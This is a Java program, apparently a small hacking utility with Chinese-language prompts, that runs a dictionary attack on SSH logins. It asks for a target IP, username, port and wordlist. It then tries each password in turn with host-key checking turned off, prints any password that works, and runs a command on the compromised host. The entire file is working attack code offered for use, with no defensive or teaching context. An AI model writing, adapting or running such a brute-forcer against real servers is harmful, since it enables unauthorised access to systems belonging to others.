
import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelExec;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.util.Scanner;

 class t15 {
    public static void main(String[] args) throws IOException, InterruptedException {
		
			Scanner in3 = new Scanner(System.in);
			System.out.println("===请输入IP===");
			String host = in3.next();
			System.out.println("===请输入用户名===");
			String user = in3.next();
			System.out.println("===请输入字典文件目录===");
			String file4 = in3.next();
			System.out.println("===请输入端口===");
			int port0 = in3.nextInt();
			File file5 = new File(file4);
			BufferedReader reader = null;
			try {
				reader = new BufferedReader(new FileReader(file5));
				String tempString = null;
				// 一次读入一行，直到读入null为文件结束
				while ((tempString = reader.readLine()) != null) {
					// 显示行号
					System.out.println("===尝试密码" + tempString + "===");
					String password = tempString;
					try {
						JSch jsch = new JSch();
						Session session = jsch.getSession(user, host, port0);
						session.setPassword(password);
						session.setConfig("StrictHostKeyChecking", "no");
						session.connect();
						if(session.isConnected()) {
							System.out.println("连接成功，密码为"+password);
							String command = "touch 1"; //命令
							Channel channel = session.openChannel("exec");
							((ChannelExec) channel).setCommand(command);
							channel.connect();
						} else {
							System.out.println("WTF???Connection failed.");
							System.out.println();
						}
						session.disconnect();
					} catch (JSchException e) {
						System.out.println("连接错误" + e.getMessage());
					}catch(IllegalArgumentException e){
						System.out.println("请输入正确的端口号");
					}
				}
				reader.close();
			} catch (IOException e) {
				e.printStackTrace();
			}catch(IllegalArgumentException e){
				System.out.println("请输入正确的端口号");
			}
			finally {
				if (reader != null) {
					try {
						reader.close();
					} catch (FileNotFoundException e) {
						System.out.println("请输入正确的字典文件目录");

					}
				}
        }
	}}
	
